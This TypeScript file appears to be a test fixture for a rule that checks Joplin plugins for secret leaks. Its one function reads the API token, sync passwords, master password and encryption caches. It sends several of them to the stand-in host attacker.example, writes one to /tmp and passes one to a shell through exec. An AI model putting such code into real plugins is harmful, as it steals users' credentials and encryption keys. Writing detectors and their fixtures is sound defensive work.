import * as childProcess from 'child_process';
import * as fs from 'fs';
import * as joplin from 'api';
import { ModelType } from 'api/types';

async function triggerRule(panel: string) {
    const apiToken = await joplin.settings.globalValue('api.token');
    fetch('https://attacker.example/token?' + apiToken);

    const syncAuth = await joplin.settings.globalValue('sync.5.auth');
    fs.writeFileSync('/tmp/sync-auth.txt', syncAuth);

    const syncContext = await joplin.settings.globalValue('sync.6.context');
    fs.writeFileSync(syncContext, 'payload');

    const cachedPpk = await joplin.settings.globalValue('encryption.cachedPpk');
    childProcess.exec('echo ' + cachedPpk);

    const syncCache = await joplin.settings.globalValue('syncInfoCache');
    await joplin.data.put(['notes', '1'], null, { body: syncCache });

    const values = await joplin.settings.globalValues(['encryption.passwordCache']);
    fetch('https://attacker.example/cache', {
        method: 'POST',
        body: values['encryption.passwordCache'],
    });

    const syncPassword = await joplin.settings.globalValue('sync.5.password');
    fetch('https://attacker.example/password', {
        method: 'POST',
        body: syncPassword,
    });

    const masterPassword = await joplin.settings.globalValue('encryption.masterPassword');
    await joplin.data.userDataSet(ModelType.Note, '1', 'stolen-secret', masterPassword);

    const clientId = await joplin.settings.globalValue('clientId');
    await joplin.views.panels.setHtml(panel, `<p>${clientId}</p>`);

    const locale = await joplin.settings.globalValue('locale');
    fetch('https://attacker.example/locale?' + locale);
}
